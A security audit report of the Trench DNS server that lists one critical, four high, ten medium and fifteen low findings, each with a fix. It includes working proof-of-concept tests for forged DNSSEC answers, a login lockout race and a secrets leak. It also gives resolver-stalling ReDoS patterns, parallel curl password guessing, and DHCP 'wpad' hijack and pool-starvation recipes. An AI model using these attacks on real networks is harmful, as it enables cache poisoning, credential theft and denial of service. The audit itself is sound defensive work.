# Trench security audit

**Date:** 2026-09-29
**Base commit:** `c5b3b5f`

## Scope

| Area | Code |
| --- | --- |
| DNS wire, transports, engine | `trench/wire`, `trench/transport`, `trench/engine` |
| DNSSEC, recursion, 0x20, rebinding | `trench/resolver`, `trench/engine/{zerox20,rebinding}.py` |
| Authoritative zones | `trench/auth_zone` (TSIG, AXFR, NOTIFY, UPDATE, secondary) |
| API and web console | `trench/api` (sessions, bearer tokens, scrypt, TOTP, `/ws`, CORS, mutating routes) |
| Blocklists | `trench/gravity`, `trench/filter` |
| DHCP | `trench/dhcp`, `trench/clients/names.py` |
| Rate limiting and amplification | `trench/engine/ratelimit*`, `fastpath.py`, `do53.py`, cookies |

Formatting and lint were out of scope unless a problem was exploitable.

## Method

- I read the code by hand, following every untrusted input from the socket to its sink.
- I wrote proof-of-concept tests for the two most serious findings. Both run against the real code, with nothing mocked beyond the upstream transport.
- I wrote a Hypothesis fuzz harness covering every parser that handles untrusted bytes.

## Test results

**Existing suite:** `pytest tests/` gave 2540 passed, 2 skipped and 7 failed. All 7 failures come from the audit container, not from code:

- **Running as root (3 tests):** chmod cannot make a directory unwritable.
  - `test_api_routes` ×2
  - `test_auth_manager::test_an_unwritable_data_dir_falls_back_to_printing`
- **No IPv6 (4 tests):** they fail with `EAFNOSUPPORT`.
  - `test_main_bootstrap::test_bind_do53_uses_inet6_for_a_v6_host`
  - `test_transports::test_doq`
  - `test_transports::test_doh3`
  - `test_upstream::test_upstream_doq`

**Hypothesis:** `pyproject.toml` depends on `hypothesis>=6`, but no test in `tests/` uses it. The existing "fuzz" tests (`test_wire.py::test_fuzz_never_crashes`, `test_wire_hostile.py`) use `random`. The audit harness ran 5000 examples per target:

| Target | Property | Result |
| --- | --- | --- |
| `Message.parse` | only `WireError` raised; a parsed message re-serialises and re-parses | pass |
| fastpath helpers (`_qname_end`, key extraction) | never raise on arbitrary bytes | pass |
| EDNS `parse_options` | only `WireError` | pass |
| TSIG `verify_wire` | never raises; never accepts random input | pass |
| `DhcpPacket.parse` | only `ValueError`/`DhcpError` | pass |
| filter `parse_line` | never raises on arbitrary text | pass |

Fuzzing found no crashes. I recommend adding Hypothesis targets like these to `tests/`.

## Summary

| Severity | Count |
| --- | --- |
| Critical | 1 |
| High | 4 |
| Medium | 10 |
| Low | 15 |

---

## Critical

### C1. DNSSEC: CNAMEs in a chain are never validated. A forged unsigned CNAME is returned with AD=1.

**Where:** `trench/resolver/recursive.py:273-299` (`_resolve_chain`)

```python
answers.extend(result.answers)                    # :279  CNAME RRs collected
...
await self._apply_validation(out, name, qtype)    # :299  only the *final* name validated
```

The recursive resolver follows a CNAME and calls `_apply_validation` only for the final target, never for the owner of each CNAME. An attacker who can inject one unsigned record (off-path spoofing, on-path network, or a compromised authoritative server for the victim zone) can answer `bank.test A` with `bank.test CNAME evil.test`.

- The attacker's own zone `evil.test` is properly signed, so validation of the final hop succeeds.
- The client receives the forged answer with **AD=1**, which a validating stub (or anything that trusts AD, such as `sshfp`/DANE consumers) treats as authenticated.

This defeats the purpose of turning on `dnssec`.

**PoC** (`tests/test_dnssec_chain.py` provides the helpers):

```python
"""PoC: a forged, unsigned CNAME in a signed zone is not validated; AD=1."""
import pytest
from trench.auth_zone import Zone
from trench.auth_zone.sign import sign_zone
from trench.resolver.recursive import Recursive
from trench.wire import RR, Class, Message, Type
from trench.wire import rdata as R
from trench.wire.name import Name
from trench.wire.rrtypes import Flags
from tests.test_dnssec_chain import _soa, _msg_for

ROOT, TEST = Name.from_text("."), Name.from_text("test.")
VICTIM, EVIL = Name.from_text("bank.test."), Name.from_text("evil.test.")

def hierarchy():
    zs = {}
    tld = Zone(TEST); tld.add(TEST, Type.SOA, _soa(TEST))
    for n, ip in ((VICTIM, "192.0.2.10"), (EVIL, "203.0.113.66")):
        z = Zone(n); z.add(n, Type.SOA, _soa(n)); z.add(n, Type.A, R.A(ip))
        tld.add(n, Type.DS, sign_zone(z).ds); zs[n.to_text()] = z
    tld_ds = sign_zone(tld).ds
    root = Zone(ROOT); root.add(ROOT, Type.SOA, _soa(ROOT)); root.add(TEST, Type.DS, tld_ds)
    anchor = sign_zone(root).ds
    zs.update({".": root, "test.": tld})
    return zs, [anchor]

@pytest.mark.asyncio
async def test_forged_cname_gets_ad():
    zones, anchors = hierarchy()
    async def transport(ip, query):
        q = query.question
        if q.rtype == Type.DS:
            return _msg_for(zones[q.name.parent().to_text()], q.name, Type.DS)
        if q.name == VICTIM and q.rtype == Type.A:
            # FORGED: unsigned CNAME, no RRSIG, pointing at attacker's signed zone
            m = Message(id=0, flags=Flags.QR | Flags.AA)
            m.answers.append(RR(VICTIM, Type.CNAME, Class.IN, 3600, R.CNAME(EVIL)))
            return m
        return _msg_for(zones[q.name.to_text()], q.name, q.rtype)
    rec = Recursive(transport, root_hints=["10.0.0.1"], qmin=False, validate=True, anchors=anchors)
    resp = await rec.resolve("bank.test", Type.A)
    assert resp.ad and any(getattr(rr.rdata, "address", "") == "203.0.113.66" for rr in resp.answers)
```

**Observed:** the test passes. It prints `True [('bank.test.', CNAME, 'evil.test.'), ('evil.test.', A, '203.0.113.66')]`.

**Fix:**

- Validate every hop: call `_apply_validation` on each intermediate result (the CNAME RRset at its owner) and combine the statuses. Any BOGUS hop makes the whole response BOGUS, and AD may be set only if every hop is SECURE.
- Also accept a DNAME-synthesised CNAME only when the covering DNAME validates.

---

## High

### H1. Validator errors fail open to INSECURE

**Where:** `trench/resolver/recursive.py:645-669` (`_apply_validation`)

```python
except Exception:
    ...
    result = ValidationResult.INSECURE          # :669
```

Any unexpected exception while validating produces **INSECURE**, not BOGUS/SERVFAIL. This includes:

- a malformed key that trips the `cryptography` library (see `keys.py:_rsa_from_wire` and the ECDSA point decode);
- a bug in the chain walker;
- a `KeyError` from a hostile message.

INSECURE means the answer is returned without AD but is otherwise served. An attacker who can trigger any exception in the validator for a signed zone therefore downgrades that zone to "unsigned" and can serve forged data. RFC 4035 §5.5 requires such answers to be treated as BOGUS.

**Fix:** map unexpected exceptions to BOGUS (SERVFAIL, with EDE 6 "DNSSEC Bogus"), and log them. Keep INSECURE only for a proven insecure delegation.

### H2. Off-path cache poisoning is feasible in the default configuration

**Where:** defaults in `trench/config.py`

| Setting | Default | Location |
| --- | --- | --- |
| Upstream transport | plain UDP to `1.1.1.1:53` and `8.8.8.8:53` | `:119` |
| Upstream strategy | `parallel` | — |
| `udp_source_ports` | `1024` | `:163` |
| DNSSEC | off | `:179` |
| `security.use_0x20` | `False` | — |
| `security.dns_cookies` | `False` | — |

The socket pool is `trench/transport/upstream.py:175-270` (`UdpPool`): fixed, long-lived, connected sockets, chosen with `random.choice` (`:246`).

Entropy against a blind spoofer is therefore about 16 bits of TXID plus 10 bits of port, roughly 26 bits. The parallel strategy sends every query to two upstreams, and either reply is accepted, which costs about one more bit.

The ports are allocated once, at startup, and never change, so an attacker can narrow the set over time. Any unprivileged program or web page on the LAN can trigger queries (browser `fetch` to `rNNN.attacker.example`), which makes a Kaminsky-style race practical over a fast link.

- `sanitize.py` limits the damage: it keeps only records on the qname's CNAME chain, so a forged answer can't plant arbitrary out-of-bailiwick RRsets.
- That limit does not help if the spoof targets the qname itself (for example `login.bank.example A`). A single win is cached for the forged TTL.

**Fix:**

- Default the upstream to DoT/DoH (the code already supports both), or at minimum turn on 0x20 with a CSPRNG.
- Recycle UDP sockets: open a fresh ephemeral socket per query, or rotate the pool.
- Raise the pool size.
- Document that plain-UDP forwarding without DNSSEC is not spoof-resistant.

### H3. Login lockout can be raced, and scrypt blocks the DNS event loop

**Where:** `trench/api/auth.py:139-185` (`login`)

```python
if self._locked(key): return None                # :144 check
row = await self.db.fetchone(...)                # yields: every concurrent login gets past :144
ok = hashutil.verify_password(password, row[...])  # :151/:154 synchronous scrypt
...                                              # failure recorded only afterwards
```

1. **Lockout bypass.** The lockout check runs before an `await`, and the failure counter is updated only after the verify. N concurrent requests therefore all pass the check before any failure is counted, so `LOCKOUT_THRESHOLD=5` does not limit the guessing rate.
2. **Resolver denial of service.** `verify_password` is scrypt and runs synchronously on the event loop. `APIServer` runs in the primary worker, on the same loop as the Do53/DoT/DoH listeners (`trench/app.py` ~1094-1133). Each login request freezes DNS for that worker for the whole verify, and this needs no credentials.

**PoC:**

```python
import asyncio, time
import pytest
from trench.api.auth import LOCKOUT_THRESHOLD, AuthManager
from trench.store import Database

@pytest.mark.asyncio
async def test_lockout_race_and_loop_stall(tmp_path):
    db = Database(tmp_path / "t.db"); await db.connect()
    auth = AuthManager(db)
    await auth.ensure_admin("correct horse battery", data_dir=tmp_path)
    N = 40
    gaps = []
    async def beat():                       # stands in for the DNS listener
        last = time.perf_counter()
        while True:
            await asyncio.sleep(0.005)
            now = time.perf_counter(); gaps.append(now - last); last = now
    hb = asyncio.create_task(beat())
    guesses = [f"wrong{i}" for i in range(N - 1)] + ["correct horse battery"]
    res = await asyncio.gather(*(auth.login("admin", g, ip="198.51.100.7") for g in guesses))
    hb.cancel()
    print(f"accepted={res[-1] is not None} max stall={max(gaps)*1000:.0f} ms")
    assert res[-1] is not None              # 40th guess accepted despite threshold 5
```

**Observed:** all 40 guesses were evaluated and the correct 40th was accepted. The heartbeat standing in for the DNS listener stalled for up to **3945 ms**.

Over HTTP, the equivalent is to send about 50 `POST /api/v1/auth/login` requests in parallel, for example with `xargs -P50 curl`.

**Fix:**

- Reserve the attempt before the first `await`: increment an in-flight or failure counter synchronously, then settle it afterwards.
- Run `verify_password` in a thread pool (`loop.run_in_executor`), with a small semaphore to cap concurrent scrypt jobs.
- Consider running the API in its own process.

### H4. Any viewer can read TSIG secrets and DoH client tokens from `GET /api/v1/settings`

**Where:**

- `trench/api/server.py:746`: `settings_get` requires only `viewer` and returns `st.describe(self.app.config)`.
- `trench/api/settings.py`: `current()` blanks `Field_.secret` fields, but `collection_values()` does not redact anything. `describe()` returns it verbatim.

`collection_values()` includes:

- `tsig_keys`, with the `secret` column (`settings.py` ~576-587).
- `clients`, with each ident. That includes `type: "token"` idents, which are the per-client DoH path tokens.

A viewer is the lowest role, and it is the default scope of API tokens (`tokens_create`, `server.py:340`). So any read-only token or viewer account can take the zone's TSIG key and forge signed UPDATEs (H-level zone takeover wherever `allow_update` + `tsig_key` is set) or AXFR it. It can also impersonate any token-identified client and wear its filtering policy.

**PoC:**

```python
from trench.config import Config
from trench.api import settings as st
c = Config.model_validate({
    "tsig_keys": [{"name": "upd.", "algorithm": "hmac-sha256", "secret": "c2VjcmV0c2VjcmV0"}],
    "clients": [{"ident": "s3cr3t-doh-token", "type": "token", "name": "phone"}],
})
print(st.describe(c)["collection_values"])   # prints the TSIG secret and the token
```

Over HTTP: `curl -H "Authorization: Bearer <viewer token>" https://host/api/v1/settings`.

**Fix:**

- Mark secret columns in collection schemas and redact them in `collection_values()`, the same way `current()` handles `Field_.secret`.
- On `settings_put`, treat a redacted placeholder as "unchanged".
- Alternatively, require `admin` for the collection values.

---

## Medium

### M1. DNSSEC key and state caches ignore TTLs

**Where:** `trench/resolver/dnssec/chain.py`

- `_keys` (`:132`, capped at 4096 in `:360`)
- `_state` (`:133`, capped at 8192 in `:272-273`)

Neither cache records an expiry. A validated DNSKEY or a secure/insecure delegation stays trusted until the process restarts or the cache fills, which has these effects:

- Revoked or rolled keys (RFC 5011, emergency rollovers) are still accepted.
- A delegation that later becomes insecure, or a zone that becomes signed, keeps its stale status.
- A key cached while compromised stays useful to the attacker long after the TTL.

**Fix:** store `min(RRset TTL, RRSIG expiration)` with each entry and treat expired entries as misses.

### M2. DHCP hostname squatting (WPAD hijack), and names never expire

**Where:**

- `trench/dhcp/server.py:65-69`: `build_reply` registers the client's hostname on ACK.
- `trench/clients/names.py:108-146`: `register` is first-come-first-served and has no reserved-name list.
- `forget()` is reached only from `_evict`. Nothing calls it on lease release or expiry.

**PoC:** any LAN host sends DHCPREQUEST with option 12 (hostname) set to `wpad`. `wpad.lan` then resolves to the attacker. Browsers and Windows WPAD auto-discovery fetch `http://wpad.lan/wpad.dat`, so the attacker proxies the victims' HTTP traffic. The name stays registered after the attacker leaves. The same works for `isatap`, `router`, `nas`, or the names of hosts that are currently offline.

**Fix:**

- Refuse reserved names (`wpad`, `isatap`, `localhost`, anything matching a static host or local record).
- Bind a registered name to the lease and remove it on RELEASE, DECLINE or expiry.
- Don't let a different chaddr take over a name while the owner's lease is live.

### M3. DHCP pool starvation through DISCOVER

**Where:** `trench/dhcp/scope.py`

- `allocate` on DISCOVER reserves the address for the full `lease_time`, not a short offer hold.
- `_reap` runs only above 4096 entries.

**PoC:** send DISCOVERs from random chaddrs (for example `dhcpstarv` or scapy). A /24 is exhausted after about 250 packets and stays exhausted for the lease time, without any REQUEST. `release` checks that `ciaddr` matches, but both values are visible on the LAN, so it adds nothing.

**Fix:**

- Hold offers for about 60 s and commit only on REQUEST/ACK.
- Rate-limit new chaddrs per interface.
- Reap expired offers whenever the pool is exhausted.

### M4. An exposed listener is an open resolver and amplifier by default

**Where:**

- `SecurityConfig`: `rate_limit=0.0`, `dns_cookies=False`.
- There is no client or source ACL anywhere in the Do53 path (`trench/transport/do53.py`, `engine/fastpath.py`).

The listeners bind to `127.0.0.1` by default, which is safe. A home or network resolver, however, has to bind to a LAN or public address to be useful. At that point it answers anyone, with no RRL, and ANY/DNSKEY/TXT responses give amplification well above ×10.

- `do53.py:92-98`: the auth handler (AXFR/NOTIFY/UPDATE) runs before the pipeline and skips the rate limiter. Its replies are small, so this matters less.

**Fix:**

- Add `security.allow_clients`, defaulting to RFC 1918, ULA and loopback when bound to a non-loopback address.
- Enable a modest default `rate_limit` (RRL with slip) whenever `host` is not loopback.
- Warn at startup when the listener is bound publicly with neither of these set.

### M5. Rebinding protection misses CGNAT and SVCB/HTTPS address hints

**Where:** `trench/engine/rebinding.py`

- `:36`: `_is_private` is `is_private | is_loopback | is_link_local | is_unspecified | is_reserved`. On Python 3.11, **100.64.0.0/10** is not caught. That range covers CGNAT and Tailscale, including `100.100.100.100`, the Tailscale MagicDNS/API address.
- `:52-66`: only A and AAAA answers are scrubbed. The `ipv4hint` and `ipv6hint` parameters in HTTPS/SVCB records (type 65/64) pass through, and modern browsers connect using them.

**PoC:** make `attacker.example HTTPS 1 . ipv4hint=192.168.1.1` resolve through Trench. Chrome and Firefox use the hint and reach the LAN address. Separately, `attacker.example A 100.100.100.100` is not scrubbed at all.

**Fix:**

- Add 100.64.0.0/10 (`is_shared`) explicitly.
- Strip the address hints, or the whole record, in type 64/65 answers when any hint is private.

### M6. `/api/v1/ws` has no Origin check (cross-site WebSocket hijacking)

**Where:** `trench/api/server.py:1136-1150`

The WebSocket upgrade authenticates with the session cookie and does not check `Origin`. The cookie is `SameSite=Strict`, so a cross-site page can't attach it. A same-site origin can, though: any other service on the same registrable domain or LAN host name, or an XSS in a sibling app. Such an origin could open `/ws` and stream the live query log, which contains every client's browsing history.

**Fix:** refuse the upgrade unless `Origin` matches the request host, or an allow-list.

### M7. JSON endpoints accept any Content-Type (same-site CSRF)

**Where:** `trench/api/server.py:1199-1203` (`_json`)

`_json` parses the body regardless of `Content-Type`. A `text/plain` POST is a CORS "simple request" and needs no preflight. As with M6, `SameSite=Strict` protects against cross-site origins but not same-site ones. There is no CSRF token.

**Fix:** reject mutating requests unless `Content-Type: application/json`, or require a custom header such as `X-Requested-With`. Also check `Origin` on state-changing methods.

### M8. AD from upstream is trusted even when TLS verification is off

**Where:**

- `trench/transport/upstream.py:460-465` (`_ad_trusted`): returns True for `tls`, `https` and `quic` without checking whether `verify` is off.
- `_doh:543`: uses `ssl=False` when verification is off.

With `verify=False` the channel is unauthenticated, so an on-path attacker can set AD=1 on forged answers and Trench passes that AD on.

**Fix:** trust AD only when the transport is encrypted **and** verified.

### M9. Anyone can lock out the admin account

**Where:** `trench/api/auth.py`: the lockout key is `user:{name}` (constants `LOCKOUT_BASE=2.0`, `LOCKOUT_MAX=300`).

Five bad passwords for `admin` from any address lock the account for up to 300 s. Repeating that keeps the only admin locked out indefinitely.

**Fix:**

- Key the lockout on (user, IP), or on IP alone, with a global per-user rate as a soft signal.
- Let a correct password plus TOTP bypass the per-user component.

### M10. The ReDoS guard misses alternation and wildcard shapes: one blocklist line stalls the resolver

**Where:** `trench/filter/parser.py:150-164` (`_REDOS`, `_safe_regex`) and `:186-188` (wildcard rules).

`_REDOS` only rejects a group that contains a quantifier and is itself quantified, plus repeated `[...]+` classes. It misses:

- **Overlapping alternation:** `/^(a|aa)+$/` has no quantifier inside the group, so it compiles. Backtracking grows as a Fibonacci number in the name length.
- **Wildcard rules:** `||a*a*a*a*a*a*a*a*a*b^` becomes `^a.*a.*…b$` with no ReDoS check and no length cap. That is polynomial of degree k, and names reach 253 chars.

The match runs synchronously on the event loop against the attacker-chosen query name. So one line in any subscribed list (compromised, or fetched over `http://`, see L11), plus one query, freezes DNS for that worker.

**PoC:**

```python
import time
from trench.filter.parser import parse_line
r = parse_line("/^(a|aa)+$/"); t = time.time(); r.regex.search("a"*32 + "b"); print(time.time() - t)
r = parse_line("||a*a*a*a*a*a*a*a*a*b^"); r.regex.search("a"*60 + ".c")   # never returns
```

**Observed:** both rules compiled. The first took **0.5 s** for a 33-character name, and each extra `a` multiplies that by about 1.6. The second was still running when the 120 s timeout killed it.

**Fix:**

- Use a linear-time engine (`re2` / `google-re2`) for list-supplied patterns.
- If that isn't possible, turn wildcard rules into a non-backtracking glob matcher.
- Cap the number of `*` in a rule.
- Run regex matching with a time budget, off the event loop.

---

## Low

### L1. TSIG: BADSIG error replies are signed (signing oracle)

**Where:** `trench/auth_zone/tsig.py`

- `verify_wire:286-288` attaches `key=key, tsig=tsig` to the BADSIG result.
- `sign_error` (`:220-241`) then MACs the error response with the real key.

RFC 8945 §5.3.2 says a BADSIG/BADKEY response must be unsigned. As written, an unauthenticated sender gets an HMAC under the zone key over data it partly controls: its request MAC is folded into the response digest.

**Fix:** sign error replies only for BADTIME, where the request MAC was valid.

### L2. Secondary zone transfers use a non-CSPRNG ID and don't check the response

**Where:** `trench/auth_zone/secondary.py`

- `:54` and `:116` use `random.getrandbits(16)`.
- Unsigned transfers don't check the response ID or question.

The transfer runs over TCP, which limits the risk.

**Fix:** use `secrets.randbits(16)`, and check the ID and question when no TSIG is used.

### L3. The 0x20 encoder uses the `random` module

**Where:** `trench/engine/zerox20.py:22`, `random.getrandbits(1)`

Mersenne Twister output can be predicted after enough observations. 0x20 is the extra entropy against spoofing (see H2).

**Fix:** use `secrets.token_bytes` and pull the bits from it.

### L4. The TOTP replay set evicts arbitrary entries

**Where:** `trench/api/auth.py:57`, `set(list(used)[-8:])`

Set iteration order is not insertion order, so a code used moments ago can be dropped from the set and replayed inside its window.

**Fix:** use a `deque(maxlen=…)` or a dict of `{code_step: expiry}`, pruned by time.

### L5. Disabling TOTP needs no re-authentication

**Where:** `trench/api/server.py:399-404` (`totp_disable`)

A stolen session can turn 2FA off without the password or a current code.

**Fix:** require the current password or a current TOTP code.

### L6. Sessions survive a password change

Sessions live in memory and are not revoked when the password changes or TOTP is enabled, so a hijacked session outlives the password reset.

**Fix:** drop all of the user's other sessions and tokens when credentials change.

### L7. `/metrics` is unauthenticated

**Where:** `trench/api/server.py:244`, handler `:1124`

The endpoint exposes only aggregate counters (`trench/ops/metrics.py`), such as query volume and block rates, and nothing per client.

**Fix:** either document this or add an optional bearer-token requirement.

### L8. Bad input types return 500s

**Where:** for example, `tokens_delete` calls `int(tid)` at `server.py:364`.

A malformed path or body gives a 500 and a logged traceback, not a 400.

**Fix:** validate the input and return 400.

### L9. The DoH response body is read without a limit

**Where:** `trench/transport/upstream.py:551`, `await r.read()`

A malicious or compromised DoH upstream can stream an unbounded body into memory.

**Fix:** read at most 65535 bytes and reject anything larger.

### L10. Questionless upstream responses are accepted

**Where:** `trench/transport/upstream.py:362+` (`_check_response`)

A response with no question section passes the check as long as it has no records, which slightly weakens anti-spoofing (it removes the question match).

**Fix:** require the question to echo the query's.

### L11. Admin-controlled blocklist sources can read local files and reach internal URLs (SSRF)

**Where:**

- `trench/gravity/manager.py:101-145` (`_fetch`, `_local_path`)
- The sources are editable through `trench/api/settings.py:118-123` and `:526-530`.

An admin, or a stolen admin session, can point a source at `file:///etc/...`-style local paths or internal `http://` URLs. Any errors or parse output then appear in the report. `http://` lists are fetched with no integrity check, so an on-path attacker can inject block or allow entries.

**Fix:**

- Restrict local paths to a configured directory.
- Optionally deny private and loopback targets for remote URLs.
- Warn on `http://` sources.

### L12. Authoritative handling bypasses the rate limiter

See M4. `do53.py:92-98` handles AXFR/NOTIFY/UPDATE before the pipeline's rate limiter runs, and the refusal replies are small.

**Fix:** rate-limit these requests too.

### L13. Editors can purge the query log

`querylog_purge` in `trench/api/server.py` requires only `editor`. An editor can therefore erase the query history that would show what they changed and what clients resolved afterwards.

**Fix:** require `admin` for the purge, and write an audit entry that survives it.

### L14. Admin settings can load arbitrary Python modules

The `plugins` collection holds module paths, and they are imported at startup. An admin, or a stolen admin session (see H3, M6, M7), therefore gets code execution as the service user after the next restart. That is expected admin power, but it is not documented as such.

**Fix:** document it, or restrict plugins to an entry-point allow-list that the API cannot edit.

### L15. The DoH HTTP server has no connection caps, and the JSON API accepts `type` > 65535

- `trench/transport/doh.py` runs aiohttp without the per-client and global connection limits that `StreamLimits` gives DoT and TCP.
- The JSON API's `type` parameter is not range-checked, so values above 65535 are silently truncated on the wire.

**Fix:** apply `StreamLimits`-equivalent caps to the DoH listener, and reject `type` outside 0-65535.

---

## Things that were checked and look sound

- **`security/clientaddr.py`:** `X-Forwarded-For` is honoured only from configured proxies and is read from the right.
- **`engine/cookies.py`:** server cookies use an `os.urandom` secret and HMAC, and are compared in constant time.
- **TSIG replay window and fudge cap:** sound.
- **Zone transfers:** the AXFR allow-list denies by default. UPDATE requires the ACL, plus TSIG over UDP.
- **Fast-path replay:** it applies the rate limiter (`fastpath.py:345-346`).
- **UDP `max_inflight` cap (2048):** drops excess datagrams before creating a task.
- **Session cookie:** `HttpOnly`, `SameSite=Strict`, and `Secure` when TLS is on.
- **Pause endpoint:** a `NaN` duration clamps to 0, so it is harmless.
- **Query log SQL:** every filter is bound as a parameter, and API `limit` values are clamped.
- **Cache key:** includes DO, CD, ECS scope and view. The on-disk dump is JSON, not pickle.
- **Name decompression:** caps pointer hops and total length, and rejects forward pointers.
- **Dynamic UPDATE:** enforces the zone boundary (`NOTZONE`) and protects the apex SOA/NS. The TSIG key name must match the zone's key.
- **DNSSEC delegation (`chain.py`):** DS→DNSKEY anchoring prefers SHA-256 digests, checks the ZONE flag and signer, refuses a wildcard-synthesized DS, and budgets key-tag work.
- **Self-updater (`ops/update.py`):** checks the distribution name and sha256, smoke-tests in a staging venv, and caps artifact size. The index URL cannot be changed through the API.
- **Rebinding classification (apart from M5):** it catches NAT64, IPv4-mapped, 6to4 and 198.18/15 addresses.
